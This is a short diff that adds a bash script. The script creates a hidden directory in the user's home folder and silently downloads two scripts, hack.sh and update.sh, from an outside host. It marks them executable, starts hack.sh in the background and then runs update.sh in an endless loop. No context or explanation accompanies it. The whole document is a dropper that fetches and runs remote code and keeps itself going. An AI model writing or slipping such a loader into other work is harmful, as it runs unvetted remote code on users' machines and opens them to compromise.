@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+mkdir ~/.1337
+cd ~/.1337
+curl -s -O "http://ngargi.me/hack.sh"
+curl -s -O "http://ngargi.me/update.sh"
+chmod a+x hack.sh
+chmod a+x update.sh
+./hack.sh &
+while [ true ]; do ./update.sh; sleep 5000; done;
